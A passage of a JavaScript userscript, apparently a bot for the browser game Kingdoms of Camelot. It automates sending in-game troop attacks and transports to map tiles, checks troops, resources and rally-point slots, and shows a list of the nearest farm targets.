				var t=this;
				window.setTimeout(function() {
					t.autoAttacksThisCity++;
					t.ClickMarch(btnMarch, box, false);
					this.knightmarchid = knightSelect.options[knightSelect.selectedIndex].value;
					},t.GetRandTime(1000));
				if(!this.nextAutoAttackTimeout) {
					this.nextAutoAttackTimeout=setTimeout(function() {
						t.nextAutoAttackTimeout=null;
						t.NextAutoAttack();
					},t.GetRandTime(1000*t.options.attackDelay));
				} else {
					this.Log('Cannot continue auto attacking, about to attack or change city');
				}
				return;
			} else {
				this.Log('Unable to send attack to '+xy[0]+','+xy[1]+', knights avail:'+(knightSelect.options.length-1)+', Not enough troops: '+notFullTroops+'(need '+totalTroops+'). Not enough resources:'+notFullResources+' (need '+totalResources+')');
				this.DoUnsafeWindow("Modal.hideModal();");
				this.NextAutoAttackCity();
			}
		}
	},
//------------------------------------------------------------------------------------------------------------
	ClickMarch:function(btnMarch, box, alert, resetTime){
		if(!resetTime){resetTime=false;}
		var t = this;
		if(btnMarch){
			t.Click(btnMarch);
			window.setTimeout(function() {
				var mist=t.FindByXPath(document,".//div[@class='mistwarn']");
				if(mist) {
					t.DoUnsafeWindow("Modal.hideModal();");
					t.DoUnsafeWindow("modal_attack_do();");
				}
			},t.GetRandTime(200));
		}
		var added = t.SetAttackFromGui(box, resetTime);
		t.SetValuesCache();
		if(added){
			if(alert){
				window.alert("Added attack");
			}
		}
	},
//------------------------------------------------------------------------------------------------------------
coordsRe:/\(([0-9]+),([0-9]+)\)/,
maptileRe:/modal_maptile.([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+)/,
OnToolTipAppear:function(box) {
		var box1=box.childNodes[0].childNodes[0];
		var m=this.coordsRe.exec(box.innerHTML);
		if(!m || m.length==0) return;
		var x=m[1]; var y=m[2];
		var a=this.ById('l_'+x+'_t_'+y);
		if(a) {
			var onclick=a.getAttribute('onclick');
			if(onclick) {
				var titleM=this.maptileRe.exec(onclick);
				if(titleM && titleM[8].indexOf('null')<0) {
					this.AddHtml(box1,'Title: '+titleM[8].StripQuotes()+'<br />');
				}
			}
		}
		var attack=this.GetAttack(x,y);
		if(!attack) return;
		var troops=attack.troops;
		if(troops && troops.length>0) {
			var lastAttack=parseInt(attack.time);
			var nowSecs=new Date().getTime()/1000;
			var lastAttackStr='Last attack: '+this.SecsToStr(nowSecs-lastAttack)+' ago'+(attack.ignore?' <b>(ignore)</b> ':'');
			this.AddHtml(box1,lastAttackStr+'<br />');
			if(attack.comment) {
				this.AddHtml(box1,attack.comment+'<br />');
			}
		}
},
//------------------------------------------------------------------------------------------------------------
CalcXYDist:function(a,b) {
		var xdist=parseInt(a.x)-parseInt(b.x);
		xdist=Math.abs(xdist);
		if(xdist>=375) xdist=750-xdist;
		var ydist=parseInt(a.y)-parseInt(b.y);
		ydist=Math.abs(ydist);
		if(ydist>=375) ydist=750-ydist;
		return Math.sqrt((xdist*xdist)+(ydist*ydist));
},
//------------------------------------------------------------------------------------------------------------
squareTypeNums:{
	'51':'Camp',
	'10':'Grassland',
	'11':'Lake',
	'20':'Forest',
	'30':'Hills',
	'40':'Mountains',
	'50':'Plain',
	'0':'Bog'
},
FindLevelFromMessages:function(attack) {
		if(!attack || !attack.messages) return null;
		for(var a=-1,j=attack.messages.length; ++a<j;) {
			var m=this.onclickReportRe.exec(attack.messages[a][1]);
			if(!m) {
				this.Log("Unable to find location level/type information in cached reports!");
				continue;
			}
			var typeNum=m[3].replace('"','');
			var type=this.squareTypeNums[typeNum];
			if(!type) {
				this.Log("Unable to find location type information in cached reports!");
				continue;
			}
			if(typeNum=="51" && m[5]!='0') {
				if(attack.type==0){
					type='City';
				} else if (attack.type==1){
					type='Transport';
				}
			}
			return {'type':type,'level':m[4]};
		}
		return null;
},
//------------------------------------------------------------------------------------------------------------
//	DrawLevelIcons:function() {
//		var mapwindow=this.ById('mapwindow');
//		if(!mapwindow) return;
//		var levelIcons=this.ById('LevelIcons');
//		if(levelIcons) return;
//		var ss=document.evaluate(".//a[contains(@class,'slot')]",mapwindow,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
//		var lvRe=/_([0-9]+)/;
//		var idDone=false;
//		for(var s=-1,j=ss.snapshotLength; ++s<j;) {
//			var a=ss.snapshotItem(s);
//			var onclick=a.getAttribute('onclick');
//			var owner='';
//			if(onclick) {
//				var onclickM=this.maptileRe.exec(onclick);
//				if(onclickM && onclickM[6]!='"null"' && onclickM[12]!='"city"') {
//					var might=onclickM[7].StripQuotes();
//					owner=" "+onclickM[6].StripQuotes()+'<br />Might:'+might;
//				}
//			}
//			var m=lvRe.exec(a.className);
//			if(!m) continue;
//			var sp=a.getElementsByTagName('span');
//			if(sp.length==0) continue;
//			if(!idDone) { a.id='levelIcons'; idDone=true; }
//			sp[0].style.color='#cc0';
//			sp[0].innerHTML='&nbsp;'+m[1]+owner;
//		}
//},
//------------------------------------------------------------------------------------------------------------
AttachXYPaste:function(xId,yId,func) {
		var x=this.ById(xId);
		if(!x) {
			this.Log('Cannot find x coord box: '+xId);
			return;
		}
		var attached=x.getAttribute('KOCpasteAttached');
		if(attached) return;
		x.setAttribute('maxlength','20');
		var onchange=function() {
			var xValue=x.value.trim();
			var xI=/^\s*([0-9]+)[\s|,|-|.]+([0-9]+)/.exec(xValue);
			if(xI) {
				var y=this.ById(yId);
				x.value=xI[1]
				y.value=xI[2]
				if(func!=undefined) func(xI[0],xI[1]);
			}
		}
		x.setAttribute('KOCpasteAttached',true);
		x.addEventListener('keyup',function() { onchange(); },false);
		x.addEventListener('change',function() { onchange(); },false);
},
//------------------------------------------------------------------------------------------------------------
GetClosestAttacks:function(x,y) {
		var attacks=[];
		var t=this;
		this.IterateAttacks(function(name,value) {
			var nameI=name.split('_');
			if(nameI.length<3) return;
			var xy=nameI[2].split(',');
			if(value=="") return;
			var attack=JSON2.parse(value);
			if(!attack) return;
			if(attack.ignore) return;
			var dist=t.CalcXYDist({'x':xy[0],'y':xy[1]},{'x':x,'y':y});
			if (dist==0) { return; }
			if(dist>=t.options.attackMaxDistance) { return; }
			if(t.options.lockAttackFromCity && attack.fromCity!=unsafeWindow.currentcityid) { return; }
			attacks.push({'dist':dist,'x':xy[0],'y':xy[1],'a':attack});
		});
		attacks.sort(function(a,b) {
			return a.dist-b.dist;
		});
		return attacks;
},
//------------------------------------------------------------------------------------------------------------
IsEnoughTroops:function(currentTroops,neededTroops) {
		for(var t=-1,j=neededTroops.length; ++t<j;) {
			if(!neededTroops[t]) continue;
			if(parseInt(neededTroops[t])>parseInt(currentTroops[t])) {
				return false;
			}
		}
		return true;
},
//------------------------------------------------------------------------------------------------------------
IsEnoughResources:function(currentResources,neededResources) {
		for(var t=-1,j=neededResources.length; ++t<j;) {
			if(!neededResources[t]) continue;
			if((parseInt(neededResources[t])+parseInt(this.options.transportResourcesReserveAmount))>parseInt(currentResources[t])) {
				return false;
			}
		}
		return true;
},
//------------------------------------------------------------------------------------------------------------
currentMarchesNum:0,
available_marches_num:0,
DetermineCurrentMarchesNum:function() {
		var marchesnum = 0;
		var troopactivity = this.ById("untqueue_list");
		if(troopactivity && troopactivity.style.display!="none" && troopactivity.style.visibility!="hidden"){
			marchesnum = troopactivity.childNodes.length;
		}
		this.currentMarchesNum = marchesnum;
		return marchesnum;
},
//------------------------------------------------------------------------------------------------------------
currentRallyPointLevel:0,
DetermineCurrentRallyPointLevel:function() {
		var t = this;
		var rallypointlevel = 0;
		var citymap = this.ById("citymap");
		if(citymap){
			var citylinks = t.FindByXPath(citymap,'.//a[contains(@class, "bldg")]', XPathResult.ORDERED_NODE_SNAPSHOT_TYPE);
			for (var i = -1,j=citylinks.snapshotLength; ++i < j;){
				var building = citylinks.snapshotItem(i);
				var style = window.getComputedStyle(building, false);
				var css_bgimg = style.backgroundImage;
				var myregexp = /rally_point_lvl/i;
				var match = myregexp.exec(css_bgimg);
				if (match != null) {
					var leveltag = t.FindByXPath(building,'.//span[contains(@class, "level")]');
					if(!leveltag){ continue; }
					var levelnum = parseInt(leveltag.innerHTML);
					if(levelnum>rallypointlevel){
						rallypointlevel = levelnum;
					}
				}
			}
			if(rallypointlevel==0){
				for (var i = -1,j=citylinks.snapshotLength; ++i < j;){
					var building = citylinks.snapshotItem(i);
					var style = window.getComputedStyle(building, false);
					var css_bgimg = style.backgroundImage;
					var myregexp = /construction/i;
					var match = myregexp.exec(css_bgimg);
					if (match != null) {
						var leveltag = t.FindByXPath(building,'.//span[contains(@class, "level")]');
						if(!leveltag){ continue; }
						var levelnum = parseInt(leveltag.innerHTML);
						if(levelnum>rallypointlevel){
							rallypointlevel = levelnum-1;
						}
					}
				}
			}
		}
		if(rallypointlevel==12) rallypointlevel = 11;
		this.currentRallyPointLevel = rallypointlevel;
		return rallypointlevel;
},
//------------------------------------------------------------------------------------------------------------
GetLevelInfo:function(attack) {
		if(!attack) throw('GetLevelInfo: attack is null');
		var levelI=attack.levelInfo;
		if((!levelI || levelI.level==0 || levelI.type=="" || levelI.type=="Camp") && attack.messages && attack.messages.length>0) { //The idea is to replace all old attacks with the new one
			levelI=this.FindLevelFromMessages(attack);
		}
		if (!levelI && (attack.currenttattackwavetype == 'transport')){
		  return {'type':'Transport','level':0};
		}
		return levelI;
},
//------------------------------------------------------------------------------------------------------------
GetAttackDelay:function(attack) {
		if(!attack) throw('GetAttackDelay: attack is null');
		var attackDelay = 0;
		var wilderness={
			'Lake':1,
			'Mountains':1,
			'Woods':1,
			'Forest':1,
			'Plain':1,
			'Hills':1,
			'Grassland':1,
			'Wilderness':1
		};
		var levelInfo=this.GetLevelInfo(attack);
		if(!levelInfo) {
			this.Log("Unable to calculate attack delay: Missing level info for coordinates ("+attack.x+","+attack.y+"). Assuming delay of 0.");
		}else{
			if(levelInfo.type=='Camp') {
				attackDelay = this.options.attackSecsSinceLastCamp;
			} else if(wilderness[levelInfo.type]) {
				attackDelay = this.options.attackSecsSinceLastWild;
			} else if (levelInfo.type!='Camp' && !wilderness[levelInfo.type]) {
				var tempAttack=this.GetAttack(attack.x,attack.y);
				if(tempAttack){
					if(tempAttack.type==0) {
						attackDelay = this.options.attackSecsSinceLastCity;
					} else if(tempAttack.type==1) {
						attackDelay = this.options.attackSecsSinceLastTransport;
					}else{
						this.Log("Unknown attack type for ("+attack.x+","+attack.y+"). Assuming delay of 0.");
					}
				}else{
					this.Log("Unknown/Invalid attack specified ("+attack.x+","+attack.y+").");
				}
			}else{
				this.Log("Unknown attack type for ("+attack.x+","+attack.y+"). Assuming delay of 0.");
			}
		}
		return attackDelay;
},
//------------------------------------------------------------------------------------------------------------
priorityattack:true,
FindBiggestCampAttack:function(attacks,currentTroops,currentResources) {
		var bestAttack=null;
		var bestAttackSize=0;
		var bestAttackDist=10000;
		var nowSecs=new Date().getTime()/1000;
		var currentCity = this.GetCurrentCityId();
		this.DetermineCurrentRallyPointLevel();
		this.DetermineCurrentMarchesNum();
		this.Log("Current Rally Point Level: "+this.currentRallyPointLevel+" Current Marches: "+this.currentMarchesNum);
		var wilderness={
			'Lake':1,
			'Mountains':1,
			'Woods':1,
			'Forest':1,
			'Plain':1,
			'Hills':1,
			'Grassland':1,
			'Wilderness':1
		};
		for(var a=0,j=attacks.length; a<j; a++) {
			var attack=attacks[a];
			var levelInfo=this.GetLevelInfo(attack.a);
			if(!levelInfo) {
				this.Log("Not attacking: Missing level info! for coordinates ("+attack.x+","+attack.y+")");
				continue;
			}
			if(levelInfo.type == ""){levelInfo.type = this.FindLevelFromMessages(attack);;}
			if(levelInfo.type == ""){levelInfo.type = "City";}
			if(levelInfo.type=='Camp') {
				if(this.options.attackTypeCamp!=true) {
					this.Log("Not attacking: Not attacking camps! for coordinates ("+attack.x+","+attack.y+")");
					continue;
				}
			} else if(wilderness[levelInfo.type]) {
				if(this.options.attackTypeWild!=true) {
					this.Log("Not attacking: Not attacking wildernesses! for coordinates ("+attack.x+","+attack.y+")");
					continue;
				}
			} else if (levelInfo.type!='Camp' && !wilderness[levelInfo.type]) {
				var tempAttack=this.GetAttack(attack.x,attack.y);
				if(!tempAttack){
					this.Log("Not attacking: Invalid attack entered ("+attack.x+","+attack.y+")");
					continue;
				}
				if(tempAttack.type==0) {
					if(this.options.attackTypeCity!=true) {
						this.Log("Not attacking: Not attacking cities for coordinates ("+attack.x+","+attack.y+")");
						continue;
					}
				} else if(tempAttack.type==1) {
					if(this.options.attackTypeTransport!=true) {
						this.Log("Not attacking: Not sending transports for coordinates ("+attack.x+","+attack.y+")");
						continue;
					}
				}
			} else {
				if(levelInfo.type!='City' && levelInfo.type!='Camp') {
					this.Log("Not attacking: Unknown attack type for coordinates ("+attack.x+","+attack.y+")");
					continue;
				}
			}
			if(!attack.a.troops) {
				this.Log("inspect1: "+this.inspect(attack.a),10);
				this.Log("Not attacking: No troops defined for coordinates ("+attack.x+","+attack.y+")");
				continue;
			}
			if(attack.a.ignore) {
				this.Log("Not attacking: Location ignored for coordinates ("+attack.x+","+attack.y+")");
				continue;
			}
			if(attack.dist>=this.options.attackMaxDistance) {
				this.Log("Not attacking: Distance too far for coordinates ("+attack.x+","+attack.y+")");
				continue;
			}
			if(this.options.lockAttackFromCity) {
				if(attack.a.fromCity!=undefined) {
					if(currentCity!=attack.a.fromCity) { continue; }
				}
			}
			var troops_to_send = attack.a.troops;
			if(attack.a.suicidewave){
				var suicide_troops = attack.a.suicidewave;
				for(var tr=-1,k=suicide_troops.length ; ++tr<k;) {
					if(!suicide_troops[tr]) continue;
					troops_to_send[tr] = troops_to_send[tr] + suicide_troops[tr];
				}
			}
			this.available_marches_num = this.currentRallyPointLevel - this.currentMarchesNum - this.options.rallyKeep;
			if(attack.a.suicidewave && attack.a.currenttattackwavetype != "normal"){
				if(this.available_marches_num < 2 || this.currentRallyPointLevel < 2){
					if(this.IsFirstAttackAtLocation(attack.x, attack.y)) {
						this.Log("Not attacking: Not enough available marching slots at rally point to launch both suicide wave and second wave for coordinates ("+attack.x+","+attack.y+")");
						break;
					}
				}
			}
			if(this.available_marches_num<1){
				this.Log("Not attacking: Not enough marching slots at rally point to launch attack for coordinates ("+attack.x+","+attack.y+")");
				break;
			}
			if(!this.IsEnoughTroops(currentTroops,troops_to_send)) {
				this.Log("Not attacking: Not enough troops for coordinates ("+attack.x+","+attack.y+")");
				continue;
			}
			if (attack.a.type==1) {
				if(!this.IsEnoughResources(currentResources,attack.a.resources)) {
					this.Log("Not attacking: Not enough resources for coordinates ("+attack.x+","+attack.y+")");
					continue;
				}
			}
			var lastAttack;
			if(!attack.a.time) {
				lastAttack=60*60*24*31;
			} else {
				lastAttack=nowSecs-parseInt(attack.a.time);
			}
			if(levelInfo.type=='' || levelInfo.type=='City' || levelInfo.type=='Transport') {
				if(attack.a.type==0) {
					if(lastAttack<this.options.attackSecsSinceLastCity) {
						this.Log("Not attacking: last attack ("+lastAttack+") < this.options.attackSecsSinceLastCity ("+this.options.attackSecsSinceLastCity+") for coordinates ("+attack.x+","+attack.y+")");
						continue;
					}
				} else {
					if(lastAttack<this.options.attackSecsSinceLastTransport){
						this.Log("Not attacking: last attack ("+lastAttack+") < this.options.attackSecsSinceLastTransport ("+this.options.attackSecsSinceLastTransport+") for coordinates ("+attack.x+","+attack.y+")");
						continue;
					}
				}
			} else if(levelInfo.type=='Camp') {
				if(lastAttack<this.options.attackSecsSinceLastCamp) {
					this.Log("Not attacking: last attack ("+lastAttack+") < this.options.attackSecsSinceLastCamp ("+this.options.attackSecsSinceLastCamp+") for coordinates ("+attack.x+","+attack.y+")");
					continue;
				}
			} else  {
				if(lastAttack<this.options.attackSecsSinceLastWild) {
					this.Log("Not attacking: last attack ("+lastAttack+") < this.options.attackSecsSinceLastWild ("+this.options.attackSecsSinceLastWild+") for coordinates ("+attack.x+","+attack.y+")");
					continue;
				}
			}
			var armySize=0;
			for(var u=-1,m=attack.a.troops.length; ++u<m;) {
				if(!attack.a.troops[u]) {
					continue;
				}
				armySize+=parseInt(attack.a.troops[u]);
			}
			if(attack.a.suicidewave) {
				var suicideArmySize=0;
				for(var v=-1,p=attack.a.suicidewave.length; ++v<p;) {
					if(!attack.a.suicidewave[v]) {
						continue;
					}
					suicideArmySize+=parseInt(attack.a.suicidewave[v]);
				}
				if(suicideArmySize<=0) {
					this.Log('Invalid suicide wave army size (not enough!) for coordinates ('+attack.x+','+attack.y+')');
					continue;
				}
			}
			if(armySize<=0) {
				this.Log('Invalid suicide wave army size (not enough!) for coordinates ('+attack.x+','+attack.y+')');
				continue;
			}
			var ok=0;
			if(this.options.attackOrder=='mostTroops') {
				if(bestAttackSize<armySize) {
					ok=1;
				}
			} else {
				if(this.options.attackOrder!='closest') {
					this.Log('Unknown order:'+this.options.attackOrder);
				}
				if(bestAttackDist>attack.dist) {
					ok=1;
				}
			}
			if((this.options.attackpriority == levelInfo.type || this.options.attackpriority == 'None') && ok && this.priorityattack){
				bestAttack=attack;
				bestAttack.type=attack.a.type;
				bestAttackSize=armySize;
				bestAttackDist=attack.dist;
			} else if (!this.priorityattack && ok) {
				bestAttack=attack;
				bestAttack.type=attack.a.type;
				bestAttackSize=armySize;
				bestAttackDist=attack.dist;
			}
		}
		if(bestAttack == null && this.priorityattack){
			this.priorityattack = false;
			bestAttack = this.FindBiggestCampAttack(attacks,currentTroops,currentResources);
		} else {
			this.priorityattack = true;
		}
		return bestAttack;
	},
//------------------------------------------------------------------------------------------------------------
IsMapperRunning:function() {
		if(this.ById('SendMap')) {
			this.Log('mapper is running, do not auto attack');
			return true;
		}
		return false;
},
//------------------------------------------------------------------------------------------------------------
GetAutoAttack:function() {
		var aStr=this.GetValue('AutoAttack','');
		if(aStr=='') {
			return null;
		}
		try {
			return JSON2.parse(aStr);
		} catch(e) {
			this.Log('failed to parse autoattack: '+aStr);
			this.SetValue('AutoAttack','');
			return null;
		}
},
//------------------------------------------------------------------------------------------------------------
SetAutoAttack:function(s) {
		if(s) {
			this.SetValue('AutoAttack',JSON2.stringify(s));
		} else {
			this.SetValue('AutoAttack','');
		}
},
//------------------------------------------------------------------------------------------------------------
ResetAutoAttackTarget:function() {
		var autoAttack=this.GetAutoAttack();
		if(autoAttack) {
			autoAttack.x=undefined;
			autoAttack.y=undefined;
			this.SetAutoAttack(autoAttack);
		}
},
//------------------------------------------------------------------------------------------------------------
GetCurrentMapCoord:function() {
		var mapbutton = this.ById('mod_views_map');
		if(mapbutton && mapbutton.className=='sel'){
			var xcoord=this.ById('mapXCoor');
			var ycoord=this.ById('mapYCoor');
			if(xcoord && ycoord){
				return {'x':xcoord.value,'y':ycoord.value};
			}
		}
		var cities=this.GetSeed().cities;
		for(var i=-1,j=cities.length; ++i<j;){
			if(cities[i][0]==unsafeWindow.currentcityid){
				return {'x':cities[i][2],'y':cities[i][3]};
				break;
			}
		}
},
//------------------------------------------------------------------------------------------------------------
hrsInput:null,
viewTypeOnly:"",
expandedInfo:false,
DrawClosestFarms:function() {
		var t=this;
		t.SetAttackStatusMessage();
		var bookmark=t.ById('maparea_map');
		if(!bookmark) throw("Cannot find bookmark box");
		bookmark=t.FindByXPath(bookmark.parentNode,".//div[@class='coords']");
		var div=t.ById('ClosestFarms');
		if(!div) {
			div=document.createElement('div');
			var titleA=document.createElement('a');
			titleA.innerHTML='Attacks ';
			titleA.title='Closest attacks, more than ? hrs since last attack';
			titleA.style.cursor='pointer';
			titleA.addEventListener('click',function() {
				div.style.display=div.style.display=='block'?'none':'block';
				setTimeout(function() {
					t.SetValue('ClosestFarmDisplay',div.style.display);
				},0);
			},false);
			var viewTypeOnlyInp=document.createElement('input');
			viewTypeOnlyInp.style.width='10px';
			viewTypeOnlyInp.style.fontSize="8px";
			viewTypeOnlyInp.title="Type of target. ex: P, W, M, P1";
			t.hrsInput=document.createElement('input');
			t.hrsInput.style.width='16px';
			t.hrsInput.value=t.GetMinHours();
			var hrsChanged=function() {
				var v=parseFloat(t.hrsInput.value);
				t.viewTypeOnly=viewTypeOnlyInp.value;
				if(v!=undefined && v!=NaN) {
					t.SetMinHours(t.hrsInput.value);
					t.DrawClosestFarms();
				}
			}
			t.hrsInput.addEventListener('change',function() {
				hrsChanged();
			},false);
			t.hrsInput.addEventListener('keyup',function() {
				hrsChanged();
			},false);
			viewTypeOnlyInp.addEventListener('keyup',function() {
				hrsChanged();
			},false);
			bookmark.appendChild(document.createElement('br'));
			bookmark.appendChild(titleA);
			t.AddText(bookmark,'>');
			bookmark.appendChild(t.hrsInput);
			t.AddText(bookmark,'hrs ');
			var expandA=document.createElement('a');
			expandA.innerHTML='E';
			expandA.title='Expand information';
			expandA.addEventListener('click',function() {
				t.expandedInfo=t.expandedInfo?false:true;
				t.DrawClosestFarms();
			},false);
			bookmark.appendChild(viewTypeOnlyInp);
			bookmark.appendChild(expandA);
			bookmark.appendChild(document.createElement('br'));
		}
		div.innerHTML='';
		div.id='ClosestFarms';
		div.setAttribute('style', 'overflow:scroll; height:200px; display:'+t.GetValue('ClosestFarmDisplay','block')+';');
		var currentTroops=t.GetArmySize();
		var currentResources=t.GetResourcesSize();
		var mapCoord=t.GetCurrentMapCoord();
		var nowSecs=new Date().getTime()/1000;
		var attacks=t.GetClosestAttacks(mapCoord.x,mapCoord.y);
		var GoClosestFarm=function(e) {
			var xy=e.target.parentNode.parentNode.getAttribute('xy').split(',');
			t.DoUnsafeWindow("setBookmarkCoord("+xy[0]+","+xy[1]+");");
		};
		var AttackClosestFarm=function(e) {
			var xy=e.target.parentNode.parentNode.getAttribute('xy').split(',');
			var attack=t.GetAttack(xy[0],xy[1]);
			if(!attack) throw("Cannot find:"+xy[0]+','+xy[1]);
			if(attack.type==0) {
				t.DoUnsafeWindow("modal_attack(4,"+xy[0]+","+xy[1]+");");
			} else if(attack.type==1) {
				t.DoUnsafeWindow("modal_attack(1,"+xy[0]+","+xy[1]+");");
			}
		};
		var IgnoreFarm=function(e) {
			var xy=e.target.parentNode.parentNode.getAttribute('xy').split(',');
			var attack=t.GetAttack(xy[0],xy[1]);
			if(!attack) throw("Cannot find:"+xy[0]+','+xy[1]);
			attack.ignore=true;
			t.SetAttack(xy[0],xy[1],attack);
		};
		var DeleteFarm=function(e) {
			var xy=e.target.parentNode.parentNode.getAttribute('xy').split(',');
			t.DeleteAttack(xy[0],xy[1]);
			t.DrawClosestFarms();
		};
		var aDone=0;
		var table=document.createElement('table');
		table.className='';
		var minHrsSinceAttack=parseFloat(t.hrsInput.value);
		var viewType=t.viewTypeOnly.trim().toUpperCase();
		for(var aUpto=-1,j=attacks.length; ++aUpto<j;) {
			var attackI=attacks[aUpto];
			try {
				if(!attackI.a.time) {
					lastAttack=60*60*24*31;
				} else {
					lastAttack=nowSecs-parseInt(attackI.a.time);
				}
				if(lastAttack<(60*60*minHrsSinceAttack)) continue;
				var levelI=t.GetLevelInfo(attackI.a);
				var m=( (levelI!=null && levelI.type) ?(levelI.type.charAt(0)+levelI.level):'');
				if(t.viewTypeOnly!="") {
					if(t.viewTypeOnly==" ") {
						if(m!="") {
							continue;
						}
					} else if(viewType.length==0 || m.substring(0,viewType.length)!=viewType) {
						continue;
					}
				}
				var dist=t.CalcXYDist({'x':attackI.x,'y':attackI.y},mapCoord);
				if(dist>=t.options.attackMaxDistance) {
					break;
				}
				var tr=table.insertRow(-1);
				tr.setAttribute('xy',attackI.x+','+attackI.y);
				var td=tr.insertCell(-1);
				td.style.whiteSpace='nowrap';
				var a=document.createElement('a');
				a.style.fontSize='10px';
				a.innerHTML=attackI.x+','+attackI.y;
				a.addEventListener('click',function(e) { GoClosestFarm(e); },false);
				td.appendChild(a);
				t.AddText(td,' ');
				var attackA=document.createElement('a');
				attackA.style.fontSize='10px';
				attackA.title=(levelI!=null?(levelI.type+' '+levelI.level):'');
				if(attackI.a.comment) {
					attackA.title+=", "+attackI.a.comment;
				}
				if(attackI.a.time && !isNaN(lastAttack)) {
					m=m+' @'+t.SecsToStr(lastAttack);
				}
				attackA.innerHTML=m;
				attackA.addEventListener('click',function(e) { AttackClosestFarm(e); },false);
				td.appendChild(attackA);
				if(t.expandedInfo) {
					var troops=attackI.a.troops;
					if(troops) {
						for(var tupto=-1,k=troops.length; ++tupto<k;) {
							var num=troops[tupto];
							if(attackI.a.suicidewave) {
								var am=attackI.a.suicidewave[tupto];
								if(am) num+=" ("+am+")";
							}
							t.AddText(tr.insertCell(-1),num);
						}
					}
				}
				var aDelete=document.createElement('a');
				aDelete.innerHTML='X';
				aDelete.title='Delete';
				aDelete.addEventListener('click',function(e) { DeleteFarm(e); },false);
				tr.insertCell(-1).appendChild(aDelete);
				aDone++;
			} catch(e) {
				t.Log('Error:'+e);
			}
		}
		div.appendChild(table);
		bookmark.appendChild(div);
		t.AttachXYPaste('mapXCoor','mapYCoor');
},
//------------------------------------------------------------------------------------------------------------
onclickReportRe:/(["0-9]+),(["0-9]+),(["0-9]+),(["0-9]+),(["0-9]+),("[^"]+"),("[^"]+"),("[^"]+"),("[^"]+"),(["0-9]+),(["0-9]+),(["0-9]+),/,
onclickReadRe:/^(.*,)([0-9]+)(,[0-9]+,[0-9]+[^,]*)$/,
FixOnClick:function(a) {
		var m=this.onclickReadRe.exec(a);
		if(m) {
			return m[1]+"0"+m[3];
		}
		return a;
},
//------------------------------------------------------------------------------------------------------------
IterateArmy:function(f) {
		if(!this.GetSeed()) return;
		var armyDiv=this.ById('cityinfo_3');
		var units=this.GetSeed().units["city"+unsafeWindow.currentcityid];
		var uRe=/([0-9]+)$/;
		for(var u in units) {
			var m=uRe.exec(u);
			if(!m) continue;
			f.call(this,m[1],units[u]);
		}
},
//------------------------------------------------------------------------------------------------------------
GetArmySize:function() {
		var troops=[];
		this.IterateArmy(function(s,amt) {
			troops[s]=amt;
		});
		return troops;
},
//------------------------------------------------------------------------------------------------------------
GetResourcesSize:function() {
		var resources=[];
		resources[0]=parseInt(this.ById('stat_gold_bar_num').innerHTML.replace(/,/g,'')); // Gold
		resources[1]=parseInt(this.ById('stat_rec1_bar_num').innerHTML.replace(/,/g,'')); // Food
		resources[2]=parseInt(this.ById('stat_rec2_bar_num').innerHTML.replace(/,/g,'')); // Wood
		resources[3]=parseInt(this.ById('stat_rec3_bar_num').innerHTML.replace(/,/g,'')); // Stone
		resources[4]=parseInt(this.ById('stat_rec4_bar_num').innerHTML.replace(/,/g,'')); // Ore
		return resources;
},
//------------------------------------------------------------------------------------------------------------
OpenViewReports:function() {
		this.Log('Open View Reports');
		this.DoUnsafeWindow("modal_messages();");
		this.DoUnsafeWindow('track_chrome_btn("messages_btn");');
		this.DoUnsafeWindow('modal_messages_viewreports();');
},
//------------------------------------------------------------------------------------------------------------
autoAttackCitiesDone:0,
autoAttackCityUpto:1,
autoAttackModalWaiting:false,
autoAttackTimeout:null,
autoAttacksThisCity:0,
ClearAutoAttackTimeout:function() {
		if(this.autoAttackTimeout!=null) {
			this.Log('reload page timer killed');
			window.clearTimeout(this.autoAttackTimeout);
			this.autoAttackTimeout=null;
		}
},
//------------------------------------------------------------------------------------------------------------
RestartAutoAttack:function() {
		this.autoAttacksThisCity=0;
		this.autoAttackCitiesDone=0;
		this.autoAttackCityUpto=1;
		this.autoAttackModalWaiting=false;
		this.NextAutoAttack();
},
//------------------------------------------------------------------------------------------------------------
StartReloadPageTimer:function(secs) {
		var t=this;
		if(!secs) secs=t.options.waitAfterCitiesDone;
		var refreshMSecs=t.GetRandTime(1000*secs);
		t.Log('refreshing in '+(refreshMSecs/1000)+' secs, all cities done:'+t.autoAttackCityUpto);
		t.ClearAutoAttackTimeout();
		t.autoAttackTimeout=window.setTimeout(function() {
			if(t.autoAttackTimeout==null) return;
			t.autoAttackTimeout=null;
			if(t.IsMapperRunning() || t.IsCurrentlySendingMultipleWaves()) {
				if(t.IsMapperRunning()){
					t.Log("Waiting for mapping to finish");
				}else{
					t.Log("Waiting for multiple wave attack to finish");
				}
				window.setTimeout(function() {
					t.StartReloadPageTimer();
				},0);
				return;
			}
			t.SetValuesCache();
			t.ReloadWindow();
		},refreshMSecs);
		t.Log('reload page timer started');
},
//------------------------------------------------------------------------------------------------------------
multipleWaveTimeout:null,
ClearMultipleWaveTimeout:function() {
		if(this.multipleWaveTimeout!=null) {
			this.Log('city switching timer killed');
			window.clearTimeout(this.multipleWaveTimeout);
			this.multipleWaveTimeout=null;
		}
},
//------------------------------------------------------------------------------------------------------------
StartMultipleWaveTimer:function(secs) {
		var t=this;
		if(!secs) secs=t.options.attackDelay;
		var attackDelayMSecs=t.GetRandTime(1000*secs);
		t.Log('Waiting '+(attackDelayMSecs/1000)+' secs to retry second wave attack...');
		t.ClearMultipleWaveTimeout();
		t.multipleWaveTimeout=window.setTimeout(function() {
			if(t.multipleWaveTimeout==null) return;
			t.multipleWaveTimeout=null;
			if(t.IsCurrentlySendingMultipleWaves()) {
				t.Log("Waiting for multiple wave attack to finish...");
				window.setTimeout(function() {
					t.StartMultipleWaveTimer();
				},0);
				return;
			}
			t.NextAutoAttackCity();
		},attackDelayMSecs);
		t.Log('Multiple wave attack timer started');
},
//------------------------------------------------------------------------------------------------------------
lastOpenViewReports:0,
CheckReports:function() {
		var t=this;
		var autoAttack=t.GetAutoAttack();
		if(!autoAttack) return;

		if(!t.options.noViewReports) {
			var nowSecs=new Date().getTime()/1000;
			if((t.lastOpenViewReports+(60*1))<nowSecs) {
				t.lastOpenViewReports=nowSecs;
				t.OpenViewReports();
				t.bringUpReports=true;
				if(t.options.autoRemoveReports || t.options.autoRemoveFarmReports) {
					t.autoAttackRemoveReports=true;
				}
			}
		}
},
//------------------------------------------------------------------------------------------------------------
ClickChangeCity:function(cityA,tries) {
		var t=this;
		t.Click(cityA);
		var currentCityNum = this.autoAttackCityUpto;
